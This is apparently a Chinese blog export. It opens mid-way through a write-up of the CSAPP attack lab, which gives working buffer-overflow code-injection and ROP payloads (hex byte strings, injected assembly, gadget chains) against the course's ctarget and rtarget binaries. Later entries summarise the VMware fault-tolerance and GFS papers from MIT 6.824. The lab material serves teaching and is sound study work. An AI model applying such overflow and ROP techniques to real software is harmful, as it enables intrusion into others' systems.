printf("No exploit. Getbuf returned 0x%x\n", val);6 &#125; 本题要求输入一段字符串，覆盖掉getbuf的返回函数地址，使得getbuf返回到另一个函数touch1去：12345671 void touch1()2 &#123;3 vlevel = 1; /* Part of validation protocol */4 printf("Touch1!: You called touch1()\n");5 validate(1);6 exit(0);7 &#125; 解决思路&emsp;&emsp;首先，需要注意的是，程序里的数据、地址按照小端法的方式保存，也就是说对于地址0x4017ef，在栈帧中的保存方式是（地址由小到大）：ef 17 40 00 00 00 00 00。嗯，是64位地址，别搞错了。 &emsp;&emsp;我们想要用输入数据覆盖掉getbuf的返回地址，并且让getbuf跳转到touch1函数去，那么我们必须需要知道 getbuf的输入缓存大小。 getbuf的栈帧大小，以此确定存放getbuf返回函数地址的栈帧区域。 touch1函数的入口地址。 那么，首先反汇编得到ctarget的汇编代码： objdump -d ctarget &gt; ctargetCode.txt 分析汇编代码，我们可以得知touch1的入口地址是0x4017c01200000000004017c0 &lt;touch1&gt;: 4017c0: 48 83 ec 08 sub $0x8,%rsp 接着分析getbuf代码，发现getbuf一共申请了0x28（十进制40）个字节来保存输入数据。1234567800000000004017a8 &lt;getbuf&gt;: 4017a8: 48 83 ec 28 sub $0x28,%rsp 4017ac: 48 89 e7 mov %rsp,%rdi 4017af: e8 8c 02 00 00 callq 401a40 &lt;Gets&gt; 4017b4: b8 01 00 00 00 mov $0x1,%eax 4017b9: 48 83 c4 28 add $0x28,%rsp 4017bd: c3 retq 一种可行的方法： 再分析调用getbuf的test函数，发现test的返回地址保存在属于getbuf栈帧的上面8个字节处：12340000000000401968 &lt;test&gt;: 401968: 48 83 ec 08 sub $0x8,%rsp 40196c: b8 00 00 00 00 mov $0x0,%eax 401971: e8 32 fe ff ff callq 4017a8 &lt;getbuf&gt; 很显然，假设当前栈顶rsp在getbuf处，那么rsp~rsp+0x27是保存输入数据，rsp+0x28~0x+2f保存getbuf的返回地址。剩下的很简单，我们输入48个字节，并且最后8个字节是touch1的入口地址即可，这里为了简单起见，我的前40个字节都是00：1234500 00 00 00 00 00 00 00 00 0000 00 00 00 00 00 00 00 00 0000 00 00 00 00 00 00 00 00 0000 00 00 00 00 00 00 00 00 00C0 17 40 00 00 00 00 00 将上述字节码保存文件ctarget-l1.txt处，输入命令即可pass第一个任务:1./hex2raw &lt; ctarget-l1.txt | ./ctarget -q Ctarget-level-2问题描述和level1类似，覆盖函数返回地址，使得getbuf函数完成后跳转到touch2函数。不同的是，这一次需要带上参数。 提示 参数是保存在%rdi处 使用ret跳转代码。因为ret是绝对地址跳转，而jmp和callq是相对地址跳转，对于注入代码来说，相对地址不好计算，绝对地址方便很多。 解决思路&emsp;&emsp;那么首先我们思考一下，在getbuf之后代码应该跳转到哪里？=&gt;跳转到我们的注入代码处。&emsp;&emsp;我们的注入代码在哪里？=&gt;在getbuf申请的rsp栈帧里。&emsp;&emsp;此时rsp~rsp+0x27存放输入数据（注入代码），rsp+0x28~rsp+0x2f存放跳转地址。&emsp;&emsp;现在问题转化为寻找当前rsp的值。&emsp;&emsp;打开gdb，在getbuf这里设置断点。然后通过print $rsp查看栈顶值。&emsp;&emsp;我的rsp是$5561dc78。 我们的思路是，将getbuf的返回函数地址修改为注入代码处的地址，也就是存放读入数据的栈顶位置，然后执行参数赋值、修改函数返回值的操作，最后ret带着参数跳转到touch2处。 剩下的就好办了，新建inject.s文件，文件内容是：123mov $0x59b997fa, %rdipush $0x4017ecret 使用先编译后反汇编得到二进制代码。1gcc -c inject.s 1Objdump -d inject.o 反汇编内容如下：123456789inject.o: file format elf64-x86-64Disassembly of section .text:0000000000000000 &lt;.text&gt;: 0: 48 c7 c7 fa 97 b9 59 mov $0x59b997fa,%rdi 7: 68 ec 17 40 00 pushq $0x4017ec c: c3 retq 得到注入代码的字节码后，将其保存到ctarget-l2.txt，文件内容是:1234548 c7 c7 fa 97 b9 59 68 ec 1740 00 c3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 dc 61 55 00 00 00 00 最后输入指令即可pass第二个问题。1./hex2raw &lt; ctarget-l2.txt | ./ctarget -q 注&emsp;&emsp;事实上，不一定是跳转到当前栈顶，可以跳转到rsp~rsp+0x1b处。 可以用倒推法，rsp~rsp+0x27是输入数据，rsp+0x28之后是函数返回地址，需要嵌入注入代码的地址。而当执行getbuf的ret时，栈顶指向rsp+0x28处。（这里的rsp指代读入数据时的栈顶位置）因为我们的注入代码通过pushq将touch2的地址嵌入到栈帧里，而ret之后，栈顶指针+8变成了rsp+30，减去压人的touch2的8位地址，剩下还有0x28个可用字节。而注入代码占13个字节，所以在rsp~rsp+0x1b任意一处注入代码都是可行的(跳转代码需要适时调整）。不过为了方便起见，显然直接在输入数据的rsp处注入代码是最好的。&emsp;&emsp;这一段说的有点乱，大家意会一下就好。 Ctarget-level-3问题描述已知在touch3内部调用了hexmatch函数，两个函数的具体定义如下：hexmatch:1234567891 /* Compare string to hex represention of unsigned value */2 int hexmatch(unsigned val, char *sval)3 &#123;4 char cbuf[110];5 /* Make position of check string unpredictable */6 char *s = cbuf + random() % 100;7 sprintf(s, "%.8x", val);8 return strncmp(sval, s, 9) == 0;9 &#125; touch3:123456789101112131011 void touch3(char *sval)12 &#123;13 vlevel = 3; /* Part of validation protocol */14 if (hexmatch(cookie, sval)) &#123;15 printf("Touch3!: You called touch3(\"%s\")\n", sval);16 validate(3);17 &#125; else &#123;18 printf("Misfire: You called touch3(\"%s\")\n", sval);19 fail(3);20 &#125;21 exit(0);22 &#125; &emsp;&emsp;要求与level2类似，都是需要将getbuf的返回地址覆盖为touch3的返回地址，并且附带参数。不同的是，这次需要输入自己cookie值的8位ascii编码值，并且将编码值的地址作为参数传入touch3中。 提示 在linux下输入”man ascii”可以看到ascii编码表。 字符串后面要加上终止符结尾。 需要将字符串的地址传到%rdi作为touch3的参数。 当调用hexmatch和strncmp时，栈帧内容可能会被这两个函数的变量覆盖。换句话说，如果把编码值放在getbuf的栈帧内，就有可能（一定会）会被其他函数的值覆盖掉。 解决思路&emsp;&emsp;仔细观察hexmatch函数，由于下面这行代码的存在，hexmatch可能会分配110个字节的空间，而这110个字节是在栈上分配的！也就是说getbuf的输入内容很可能会被覆盖。那么我们应该把cookie字符串放哪里好呢？一个自然的想法是放在当前rsp栈帧的很后面，保证不会被后面函数申请的栈帧覆盖，然而这很难；第二种选择就是往上覆盖之前函数的栈帧，这样一来地址就确定了，而且不怕被后来的函数覆盖。1char *s = cbuf + random() % 100; &emsp;&emsp;那么接下来就很简单了，生成下面代码的字节码，然后在rsp+0x28处写上touch3的函数地址，在rsp+0x30处写上cookie的16进制表示的ascii值。因为rsp+0x30属于test函数，把字符串放这里不用怕被后面的函数覆盖掉，因为test函数一直没有返回，所以其申请的栈帧一直有效。123mov $0x5561dca8, %rdipushq $0x4018faret 最后得到输入的字节码：12345648 c7 c7 a8 dc 61 55 68 fa 18 40 00 c3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 dc 61 55 00 00 00 00 35 39 62 39 39 37 66 61 00 Rtarget-level-1Rtarget的程序加入了以下两项保护措施，无法像ctarget一样直接定位栈帧位置。 栈随即初始化，每次运行栈地址都不确定，不能再像上面一样，通过修改固定栈位置的值来改变函数跳转的地址。 栈内部的代码不允许执行。 问题描述&emsp;&emsp;和Ctarget-level-2的问题一样，覆盖getbuf的返回地址跳转到touch2处，并且输入自己的cookie值作为touch2的函数参数。不同的是，这里要求使用ROP方式。 &emsp;&emsp;因为这里使用了栈随机化，程序每次运行的栈位置都不一样，不想用ROP也不行。 解决思路首先反汇编rtarget，并且找到start_farm至end_farm处的代码（节选）：12300000000004019a0 &lt;addval_273&gt;: 4019a0: 8d 87 48 89 c7 c3 lea -0x3c3876b8(%rdi),%eax 4019a6: c3 retq 可以发现，地址0x4019a2处开始48 89 c7 c3恰好构成一条gadget，并且是mov %rax, %rdi。而%rdi正是我们传进touch2的参数。 剩下的有两件事： 第一，将cookie值赋值给%rax。 第二，跳转到touch2函数。 然后我们接着找，看看有没有含有cookie值的字节码。 显然找不到！ &emsp;&emsp;对于寄存器间的操作，能找到是正常的。但是对于数字间的赋值操作，找不到也是正常的，因为我们想赋值的数字千变万化，匹配不到很正常。所以对于赋值语句，我们要转换一下思路，不能使用mov语句来赋值，而应该使用别的，不是立即数形式的赋值语句，并且最好还和栈帧有关，因为我们只能在栈帧注入代码，换言之，我们所想要赋的值就保存在栈帧里。 &emsp;&emsp;仔细遍历一下指令集，发现popq正好满足我们的要求！popq是将当前rsp的值赋值给某个寄存器，然后rsp+8。 &emsp;&emsp;那么就好办了，我们将cookie值注入栈帧中，先是popq给某个寄存器，然后再通过ret跳转到mouv %rax,%rdi语句，然后再通过ret跳转到touch2函数。 12300000000004019a7 &lt;addval_219&gt;: 4019a7: 8d 87 51 73 58 90 lea -0x6fa78caf(%rdi),%eax 4019ad: c3 retq &emsp;&emsp;仔细观察代码，发现在0x4019ab有一个gadget，且58是popq %rax，90是nop占位指令，恰好满足我们的要求。 &emsp;&emsp;所以栈帧顺序是这样的： 记录getbuf返回地址的rsp值应该是0x4019ab，用于跳转到popq %rax指令，跳转后rsp+8的值就是popq的值，也即是cookie值。 在完成popq操作后，rsp再度加8变成rsp+0x10，此时ret返回应该是跳转到mov %rax,%rdi处，所以rsp+16是0x4019a2。 执行完赋值语句后，程序应该通过ret跳转到touch2函数，所以rsp+0x18处存放到应该是touch2的程序入口地址。 代码如下：1234567800 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ab 19 40 00 00 00 00 00 popqfa 97 b9 59 00 00 00 00 cookiea3 19 40 00 00 00 00 00 movec 17 40 00 00 00 00 00 touch2 Rtarget-level-3问题描述&emsp;&emsp;和ctarget-level-3一样，只不过这次用ROP攻击方式。 解决思路&emsp;&emsp;这题咋一看挺简单的，因为从level2我们就知道了用popq弹出栈帧内容并且赋值给rdi的方法。然而真正处理的时候才发现坑很大。 &emsp;&emsp;首先，level3要输入的是字符串的地址，并且这个字符串是9位的！！不是8位的。这时候查表，我们可以找到将rsp赋值给rax的字节码。 &emsp;&emsp;然而问题来了，将rsp赋值给rax后，rsp的内容并没有改变，此时ret返回的地址是rsp当前的值，也就是作为touch3参数的cookie值。而接下来ret将会以cookie值作为程序地址跳转，这显然是不行的。 &emsp;&emsp;于是我们思考，能不能找到一个语句，在将rsp的内容赋值给rax之后，对rsp的值进行更改？确实有，那就是popq。所以我们的目标是，找到一句rsp赋值语句后接pop的字节码。 &emsp;&emsp;然而找不到。此路不通。嗯，接下来，想到秃头也没想到怎么办才好，那就只能谷歌了。 仔细观察代码，发现有一句：12300000000004019d6 &lt;add_xy&gt;: 4019d6: 48 8d 04 37 lea (%rdi,%rsi,1),%rax 4019da: c3 retq &emsp;&emsp;这就是破局的关键。我们只需要将cookie放在栈帧的最上方，然后计算出一个基址和偏移值，并将基址和偏移值分别赋值给rdi和rsi就能得到cookie的地址，并且将这个地址传递给rax，然后传递给rdi，大功告成。 &emsp;&emsp;剩下的问题是，如何赋值给rsi。&emsp;&emsp;查表，没想到这个也要绕路。&emsp;&emsp;先是查到有mov %ecx,%esi，嗯找什么可以赋值给ecx，&emsp;&emsp;然后查到有mov %edx, %ecs，嗯找什么可以复制给edx，&emsp;&emsp;最后查到有mov %eax, %edx，嗯搞定了。 最后梳理一下: 首先将rsp的基址传给rdi，可以将rsp传递给rax再传递给rdi。 然后通过pop得到偏移值，再将偏移值七绕八拐传递给rsi。 最后跳转到touch3处，搞定。 输入字节码如下：12345678910111213141500 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0000 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 06 1a 40 00 00 00 00 00a2 19 40 00 00 00 00 00 cc 19 40 00 00 00 00 0048 00 00 00 00 00 00 00dd 19 40 00 00 00 00 0070 1a 40 00 00 00 00 0013 1a 40 00 00 00 00 00d6 19 40 00 00 00 00 00a2 19 40 00 00 00 00 00fa 18 40 00 00 00 00 0035 39 62 39 39 37 66 61 00 事后&emsp;&emsp;完成这个实验，获益匪浅。见识了两种曾经的主流缓冲区溢出破坏方式，加深了我对栈帧空间的理解。希望以后写代码时，我能够以一个更为底层的角度去考虑代码结构，去思考代码的合理性与安全性。]]></content>
      <categories>
        <category>c语言</category>
      </categories>
      <tags>
        <tag>c语言</tag>
        <tag>CSAPP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MIT6.824-LEC04-VMWARE-ft]]></title>
    <url>%2F2019%2F05%2F22%2FMIT6-824-LEC04-VMWARE-ft%2F</url>
    <content type="text"><![CDATA[&emsp;&emsp;本文介绍用于虚拟机的容错机制。通过建立backup备份机同步primary虚拟机的状态，使得当primary宕机时，备份机可以立刻补上，并且在整个恢复的过程中，用户并没有感受到太大的差异。从用户视角出发，他们自始至终都在访问同一台虚拟机，备份机的存在对他们而言是透明的。这一种容错机制，个人认为适用于计算节点的容错恢复，比如MapReduce中Master,Map和Reduce节点的状态保存和数据备份。 参考：The Design of a Practical System for Fault-Tolerant Virtual Machines容错虚拟机分布式系统的设计 在论文发布的年代，有两种常见的虚拟机内容备份/错误恢复策略： 第一种是primary/backup策略， 这种策略要求将primary虚拟机的所有活动，包括但不限于CPU、内存、I/O读写等的状态全部通过网络同步到备份虚拟机中。好处是当primary虚拟机挂了时，备份虚拟机可以立刻顶上。坏处是占用的带宽太多了。 第二种方法是状态机策略。这种策略是把primary和备份的虚拟机放在同一集群中两台独立的机器上，并且共享磁盘，primary将自己接收到的指令通过logging channel（可以看成是一条稳定的tcp连接）发给backup虚拟机，然后primary和备份虚拟机同时执行同一条指令。当然，最终只有primary的结果会输出到外部，backpu执行指令只是为了保持和primary同样的状态。只有primary虚拟机可以与外界进行交互，理论上来说，backup对外界而言是不可见的。 &emsp;&emsp;VMware的容错机制是把虚拟机看成是一种状态机，这种状态机的输出由输入决定，换句话说，当开始状态相同，并且输入的次数和顺序确定时，输出也随之确定。因而当primary和备份虚拟机以同样的状态初始化，并且以相同顺序执行相同指令时，两者可以输出同样的结果，进而保持一致的状态。&emsp;&emsp;然而，事实上虚拟机接受到的指令不全是确定性的指令，有一些指令的输出是不确定的（如中断事件、读取CPU时钟计数器的值），输入相同的不确定指令并不能得到相同的结果。因此，设计容错系统的难点在于： 需要捕捉全部的输入和不确定指令以同步primary和backup的状态。 需要将全部的输入和不确定指令应用到backup中。 需要在保证1.2.两点的同时，保证系统高效可用。&emsp;&emsp;因此primary和备份机之间除了同步确定性指令之外，还会通过额外的信息来同步两者的状态。 FT协议 Output requirement: If the backup VM ever takes over after a failure of the primary, the backup VM will continue executing in a way that is entirely consistent with all outputs that the primary VM has sent to the external world. &emsp;&emsp;VM容错机制对备份机的要求是，当primary虚拟机出现错误并且选用备份机时，备份机需要遵循primary与外界数据交互的方式。换句话说，在备份机取代primary的过程中，用户不能察觉到任何变化，从用户视角来看，一直都是和同一个虚拟机进行交互。 &emsp;&emsp;为了确保这个要求，VM采用了一条准则： Output Rule: The primary VM may not send an output to the external world, until the backu VM has received and acknowledged the log entry associated with the operation producing the Output. &emsp;&emsp;在primary接收到能产生输出结果的指令后，首先将这条指令写入到本地日志文件，然后将日志文件新增的内容通过Logging channel发送到backup虚拟机，在发送的过程中，primary实质上已经在执行指令。然后备份机接受到指令，并且通过logging channel返回确认指令。primary只有在接收到备份机的ack确认指令后，才会将计算好的结果输出到外部。注意，Primary 只是推迟将 output 发送给外界，而不会暂停执行后边的任务。 &emsp;&emsp;如上图所示，当primary接收到需要输出结果的指令时，首先将指令发送给备份机，然后自己继续执行该条指令以及其他指令。直到primary接收到来自backup的确认指令，primary才将计算好的结果输出。 Logging Channel设计Logging Channel遵循以下几点规则： primary通过管道向backup同步指令。 backup从管道中读取指令并执行，如果管道为空，则不做任何事情。 如果管道满了，primary就会停等，一直到管道有空位为止。&emsp;&emsp;从上面几点规则可以看出管道不能太小，否则会阻塞primary。因为如果管道满了，primary就要停等阻塞，所以这是不是意味着管道越大越好呢？ &emsp;&emsp;事实上也不能太大，因为primary的ouput需要等到backup的确认，如果管道太大，后面的output需要等很久才能等到backup的确认，此时primary会处于“死机”状态，不会和客户进行互动，也没有输出。另一方面，当primary挂了，恢复的时间等同于检测到失败的时间+backup执行管道操作恢复状态的时间，如果管道太长，恢复时间越长，failure的影响越大。 裂脑(split-brain问题）&emsp;&emsp;裂脑问题是指，如果出现网络分区，此时primary和backup两台机器失去联系，然而两台机器都可以正常运行，这时候哪台应该可以与外界联系？ 答：VM是建立在共享磁盘上的，所以primary和backup在断开联系后，会对共享磁盘内的某个变量进行test，如果test成功就表示自己可以成为primary，如果失败，则是backup。 &emsp;&emsp;除了共享磁盘之外，VM也有尝试过非共享磁盘的设计方式。共享磁盘可以看成是与外部的联系，所以任何与共享磁盘交互的信息都需要满足output rule。然而，如果采用非共享磁盘方式，backup和primary对应的磁盘可以看成是他们内部的状态，不需要等待output rule来写入磁盘。然而这么设计，logging channel不仅需要传递操作指令，还需要监视磁盘的状态让backup和primary的磁盘状态保持一致。此外，当出现网络分区时，因为此时不存在共享磁盘，无法通过test来确定primary。此时需要额外的第三方server来确定primary。 &emsp;&emsp;一般情况下，不管是不是采用共享磁盘的设计，backup都不会从磁盘处读取数据。相反，backup一般是从logging channel处获取读取的结果，以此来保持和primary的一致性，然而这么做毫无疑问会极大占用logging channel的传输带宽。 &emsp;&emsp;但是，如果允许backup读取磁盘信息，那情况就会变得很复杂了。如果primary和backup只有一方读取成功而另一方读取失败怎么办？一方只能不停尝试直到读取成功为止，然而这就很容易失去与primary的一致性。 事后总结&emsp;&emsp;看完整篇论文，其实认识不深。这些结构设计上的东西，不亲手过一遍很难有深刻的体会。没有相关经验很难体会出设计有哪些精妙的地方，如同雾里看花，只能大概了解一下框架，而缺乏对内部结构细节的感受。]]></content>
      <categories>
        <category>分布式</category>
        <category>MIT</category>
      </categories>
      <tags>
        <tag>分布式</tag>
        <tag>MIT6.824</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MIT6.824-LEC3-GFS]]></title>
    <url>%2F2019%2F05%2F21%2FMIT6-824-LEC3-GFS%2F</url>
    <content type="text"><![CDATA[&emsp;&emsp;GFS是谷歌在03年发布的关于构建分布式文件系统的论文，全文高屋建瓴的概括了建立分布式文件系统的方向和各种性能之间的权衡，提出了设计分布式文件系统的初衷，描述了相关背景意义，详尽的解释了GFS的设计理念和构筑流程，描绘了许多难点和挑战，具有非常高的启发意义。然而本文干货太多了，读每一段的时候都感觉大有收获，但是读完下一段上一段的内容就忘的差不多了，及至读完全文，大脑因为接受信息太多而一片混沌。本文参考网上一些博客和导读，旨在梳理整篇文章的思路，以及做一些总结。 参考本文写的非常简略，只是把一些重点摘抄出来，建议大家看看这个 。原文地址经典论文翻译导读之《Google File System》典型分布式系统分析 GFS提出的背景&emsp;&emsp;随着谷歌公司的发展，和MapReduce的应用，关于如何存储数据，以及如何快速读取、删除、修改数据成为一个困扰公司发展的难题。GFS的设计着眼于几个目标：性能、可伸缩性、可靠性和可用性。GFS汲取传统文件系统的精华，结合具体场景需求做出了大胆的创新，他们所基于的场景有如下几种特点： 组件故障是常态而不是异常。当年谷歌公司用的磁盘并不昂贵，很容易出现各种问题导致数据丢失或者磁盘短时间不可用。 要处理的文件不仅非常大，而且多，且每个文件内的应用对象复杂，给文件系统索引带来很大挑战。 大部分文件的修改都是在文件后面append新的数据，而不是覆盖或者改写已有的数据，随机写几乎不存在。 向应用提供类似文件系统的API，提高了系统的灵活性。 GFS系统的假设&emsp;&emsp;任何系统都是根据实际需求设计的，而在设计过程中，则需要抽象出实际场景的特点并进行相应的假设，从而根据这些假设推导出系统所必需的功能。GFS是基于以下几个假设设计的： 系统是构建在很多廉价的、普通的组件上，组件会经常发生故障。它必须不间断监控自己、侦测错误，能够容错和快速恢复。 系统存储了适当数量的大型文件，我们预期几百万个，每个通常是100MB或者更大，即使是GB级别的文件也需要高效管理。也支持小文件，但是不需要着重优化。 系统主要面对两种读操作：大型流式读和小型随机读。在大型流式读中，单个操作会读取几百KB，也可以达到1MB或更多。相同客户端发起的连续操作通常是在一个文件读取一个连续的范围。小型随机读通常在特定的偏移位置上读取几KB。重视性能的应用程序通常会将它们的小型读批量打包、组织排序，能显著的提升性能。 也会面对大型的、连续的写，将数据append到文件。append数据的大小与一次读操作差不多。一旦写入，几乎不会被修改。不过在文件特定位置的小型写也是支持的，但没有着重优化。 系统必须保证多客户端对相同文件并发append的高效和原子性。我们的文件通常用于制造者消费者队列或者多路合并。几百个机器运行的制造者，将并发的append到一个文件。用最小的同步代价实现原子性是关键所在。文件被append时也可能出现并发的读。 持久稳定的带宽比低延迟更重要。我们更注重能够持续的、大批量的、高速度的处理海量数据，对某一次读写操作的回复时间要求没那么严格。 GFS的架构&emsp;&emsp;GFS一共由三部分组成：Master、Client、Chunkserver。其中，Master任意时刻只能同时存在一个，而Chunkserver和client有很多个。&emsp;&emsp;存入到GFS的文件被划分为很多个chunk，每个chunk大小是64MB，并且在创建时会被分配一个全局唯一的chunk句柄。这些chunk被存储到许多个服务器上，这些管理文件chunk的服务器被称为Chunkserver。在Chunkserver上，chunk是以普通linux文件存储，并且按照chunk句柄和字节范围来读写chunk数据。为了可靠性，每个chunk被复制到多个chunkserver上，默认是3份，并且一般是跨机房/架复制，用户能为不同命名空间的文件配置不同的复制级别。&emsp;&emsp;master维护所有的文件系统元数据。元数据包括命名空间（文件名字树）、从文件到chunk的映射、chunk的位置（处于哪一个chunkserver中）。同时也负责负责整体的调度，比如chunk租赁管理（后面会提到），孤立chunk的垃圾回收（不属于任何一个文件但是有内容的chunk），以及chunkserver之间的数据迁移。master会周期性的和每个chunkserver通过心跳信息通信，收集他们的状态。&emsp;&emsp;客户端和chunkserver都不会缓存信息，因为大部分应用都是顺序读取文件，因此缓存文件之间的chunk收益很低。&emsp;&emsp;GFG采用单一Master节点，单一master节点能够保证多个客户请求是有序的，能够使用全局策略执行复杂的chunk布置、指定复制决策等。因为所有client的文件访问都要经过master调度，所以在读写过程中应该尽量减少和master节点的依赖，转而将读写压力放到具体chunkserver中。一般而言，客户端只是从master节点获取文件保存的chunkserver保存的地址，后续的读写操作都会在client和chunkserver之间进行。一个典型的文件读操作是这样的： 应用程序调用GFS client提供的接口，表明要读取的文件名、偏移、长度。 GFS Client将偏移按照规则翻译成chunk序号，发送给master。 master将chunk id与chunk的副本位置告诉GFS client。 GFS client向最近的持有副本的Chunkserver发出读请求，请求中包含chunk id与范围。 ChunkServer读取相应的文件，然后将文件内容发给GFS client。 GFS的操作日志&emsp;&emsp;操作日志是对重要元数据变更的历史记录。它是GFS的核心之一。不仅因为它是元数据唯一的持久化记录，而且它还要承担一个逻辑上的时间标准，为并发的操作定义顺序。各文件、chunk、以及它们的版本，都会根据它们创建时的逻辑时间被唯一的、永恒的标识。既然操作日志这么重要，我们必须可靠的存储它，而且直至元数据更新被持久化完成（记录操作日志）之后，才能让变化对客户端可见。否则，我们有可能失去整个文件系统或者最近的客户端操作，即使chunkserver没有任何问题（元数据丢了或错了，chunkserver没问题也变得有问题了）。因此，我们将它复制到多个远程机器，直到日志记录被flush到本地磁盘以及远程机器之后才会回复客户端。master会捆绑多个日志记录，一起flush，以减少flush和复制对整个系统吞吐量的冲击。master可以通过重放操作日志来恢复它的元数据状态。为了最小化master的启动时间，日志不能太多（多了重放就需要很久）。所以master会在适当的时候执行“存档”，每当日志增长超过一个特定的大小就会执行存档。所以它不需要从零开始回放日志，仅需要从本地磁盘装载最近的存档，并回放存档之后发生的有限数量的日志。存档是一个紧密的类B树结构，它能直接映射到内存，不用额外的解析。通过这些手段可以加速恢复和改进可用性。因为构建一个存档会消耗点时间，master的内部状态做了比较精细的结构化设计，创建一个新的存档不会延缓持续到来的请求。master可以快速切换到一个新的日志文件，在另一个后台线程中创建存档。这个新存档能体现切换之前所有的变异结果。即使一个有几百万文件的集群，创建存档也可以在短时间完成。结束时，它也会写入本地和远程的磁盘。恢复元数据时，仅仅需要最后完成的存档和其后产生的日志。老的存档和日志文件能被自由删除，不过我们保险起见不会随意删除。在存档期间如果发生故障（存档文件烂尾了）也不会影响正确性，因为恢复代码能侦测和跳过未完成的存档。 GFS的一致性保证&emsp;&emsp;文件命名空间变化（比如文件创建）是原子的，只有master能处理此种操作：master中提供了命名空间的锁机制，保证了原子性的和正确性；master的操作日志为这些操作定义了一个全局统一的顺序。然而，客户对数据的更改是不确定的，可能会有多个用户同时对同一个文件进行修改，又因为文件的chunk存在副本，每个客户可能访问到同一个文件的不同副本，如果此时不同客户对同一文件的不同副本进行修改，就会带来文件内容不一致的效果。GFS采用租赁机制解决这个问题。首先，GFS将文件修改划分为以下几个状态：&emsp;&emsp;在有ABC三个客户，对同一文件分别增加了123（A增加的），456（B增加的），789（C增加的）三行数据的情况下，如果ABC三个客户都看到了123，456，789中的任意一个，那么就称本次修改是defined的。如果三个客户都看到同一个数据，但是这个数据是多个修改混合的结果，比如ABC都看到了148或者257，这种情况下，文件三个副本的内容是一致的，但是文件的修改是多个客户修改混合的结果，这种情况被称为undefined。&emsp;&emsp;为了解决undefined的情况，GFS采用了租赁机制。假设同一个文件有三个副本，租赁机制是指，其中的某一个副本向master申请为这个文件三个副本的主副本，其余两个副本是次副本。当接到多个用户的修改时，这些修改会先同一发到主副本，主副本将这些修改排序，然后将排序后的文件修改顺序同步到其余两个副本，这样一来，三个副本都能按照同一个修改顺序串行更改文件内容。 &emsp;&emsp;这里的串行更像是逻辑上的串行，而不是执行修改操作的顺序。也即是说，这里的串行规定了多个更改的顺序，而执行更改时，可以根据修改的顺序推测处某次修改的文件偏移量，然后多个修改并发进行。比如接到了ABCD四个更改，经过主副本排序后，一致认定以ABCD的顺序进行修改。此时对于B修改而言，只要计算出A修改后的文件偏移量，就能计算出自己修改的文件偏移量，然后和A同时更改文件即可。 GFS的数据写入过程在GFS中，数据流与控制流是分开的，如图所示： Client向master请求Chunk的副本信息，以及哪个副本（Replica）是primary。 maste回复client，client缓存这些信息在本地。 client将数据（Data）链式推送到所有副本。 Client通知Primary提交。 primary在自己成功提交后，通知所有Secondary提交。 Secondary向Primary回复提交结果。 primary回复client提交结果。GFS将数据流和控制流信息分开的目的是最大化利用每个机器的网络带宽，避免网络瓶颈和高延迟连接，最小化推送延迟。 GFS的垃圾文件回收&emsp;&emsp;在一个文件被删除后，GFS不会立刻回收物理存储。它会在懒惰的、延迟的垃圾回收时才执行物理存储的回收。&emsp;&emsp;当一个文件被应用删除时，master立刻打印删除操作的日志，然而不会立刻回收资源，仅仅将文件重命名为一个隐藏的名字，包含删除时间戳。在master对文件系统命名空间执行常规扫描时，它会删除任何超过3天的隐藏文件（周期可配）。在那之前此隐藏文件仍然能够被读，而且只需将它重命名回去就能恢复。当隐藏文件被删除时，它才在内存中元数据中被清除，高效的切断它到自己所有chunk的引用。&emsp;&emsp;在另一个针对chunk命名空间的常规扫描中，master会识别出孤儿chunk（也就是那些任何文件都不会引用的chunk），并删除它们的元数据。在与master的心跳消息交换中，每个chunkserver都会报告它的一个chunk子集，master会回复哪些chunk已经不在其元数据中了，chunkserver于是删除这些chunk的副本。&emsp;&emsp;尽管分布式垃圾回收是一个困难的问题，它需要复杂的解决方案，但是GFS的做法却很简单。master的“文件到chunk映射”中记录了对各chunk引用信息。GFS也能轻易的识别所有chunk副本：他们是在某台chunkserver上、某个指定的目录下的一个Linux文件。任何master没有登记在册的副本都可以认为是垃圾。GFS的垃圾回收方案主要有三点优势： 保证了可靠性的同时也简化了系统。 垃圾回收的逻辑被合并到master上各种例行的后台活动中，比如命名空间扫描，与chunkserver的握手等。所以它一般都是批处理的，花费也被大家分摊。而且它只在master相对空闲时执行，不影响高峰期master的快速响应。 延迟的回收有时可挽救偶然的不可逆的删除（比如误操作）。 旧副本侦测&emsp;&emsp;当chunkserver故障，错过对chunk的变异时，它的版本就会变旧。master会为每个chunk维护一个版本号来区分最新的和旧的副本。&emsp;&emsp;每当master授予一个新的租赁给某个chunk，都会增长chunk版本号并通知各副本。master和这些副本都持久化记录新版本号。这些都是在写操作被处理之前就完成了。如果某个副本当前不可用，它的chunk版本号不会被更新。master可以侦测到此chunkserver有旧的副本，因为chunkserver重启时会汇报它的chunk及其版本号信息。如果master看到一个比自己记录的还要高的版本号，它会认为自己在授予租赁时发生了故障，继而认为更高的版本才是最新的。&emsp;&emsp;master会在常规垃圾回收活动时删除旧副本。在那之前，它只需保证回复给客户端的信息中不包含旧副本。不仅如此，master会在各种与客户端、与chunkserver的其他交互中都附带上版本号信息，尽可能避免任何操作、活动访问到旧的副本。]]></content>
      <categories>
        <category>分布式</category>
        <category>MIT</category>
      </categories>
      <tags>
        <tag>分布式</tag>
        <tag>MIT6.824</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MIT6.824-lab1-MapReduce]]></title>
    <url>%2F2019%2F05%2F19%2FMIT6-824-lab1-MapReduce%2F</url>
